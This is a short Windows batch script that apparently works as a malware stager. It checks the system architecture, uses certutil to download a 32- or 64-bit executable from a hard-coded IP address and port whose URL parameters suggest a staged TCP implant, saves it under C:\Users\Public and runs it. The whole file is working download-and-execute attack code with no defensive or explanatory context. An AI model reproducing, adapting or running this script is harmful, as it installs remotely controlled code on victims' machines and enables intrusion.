@echo off
setlocal enabledelayedexpansion

set u64="http://156.226.172.243:14686/?h=156.226.172.243&p=14686&t=tcp&a=w64&stage=true"
set u32="http://156.226.172.243:14686/?h=156.226.172.243&p=14686&t=tcp&a=w32&stage=true"
set v="C:\Users\Public\f528764dtcp.exe"
del %v%
for /f "tokens=*" %%A in ('wmic os get osarchitecture ^| findstr 64') do (
    set "ARCH=64"
)
if "%ARCH%"=="64" (
    certutil.exe -urlcache -split -f %u64% %v%
) else (
    certutil.exe -urlcache -split -f %u32% %v%
)

start "" %v%
exit /b 0